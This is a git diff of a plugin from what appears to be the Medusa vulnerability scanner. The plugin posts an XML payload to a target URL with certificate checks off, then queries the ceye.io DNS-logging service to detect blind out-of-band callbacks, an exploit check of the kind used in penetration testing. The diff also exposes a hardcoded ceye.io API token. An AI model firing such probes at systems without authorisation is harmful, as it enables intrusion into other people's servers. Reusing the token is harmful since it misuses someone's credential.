@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # _*_ coding: utf-8 _*_
-import urllib
+import urllib.parse
 import requests
 import time
 
@@ -104,17 +104,18 @@ def medusa(Url,RandomAgent,ProxyIp):
         'Content-Type': 'application/xml',
 
     }
-    s = requests.session()
-    try:
-        if ProxyIp != None:
-            proxies = {
-                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-                "http": "http://" + str(ProxyIp)
-            }
 
-            resp = s.post(payload_url, data=payload, headers=headers,proxies=proxies, timeout=5, verify=False)
-        elif ProxyIp == None:
-            resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
+    try:
+        s = requests.session()
+        # if ProxyIp != None:
+        #     proxies = {
+        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+        #         "http": "http://" + str(ProxyIp)
+        #     }
+        #
+        #     resp = s.post(payload_url, data=payload, headers=headers,proxies=proxies, timeout=5, verify=False)
+        # elif ProxyIp == None:
+        resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
         ceyeurl = 'http://api.ceye.io/v1/records?token=f84734983a259c598a1edeb772981d14&type=dns&filter='
         time.sleep(5)
         ceye_content = requests.get(ceyeurl, timeout=3)
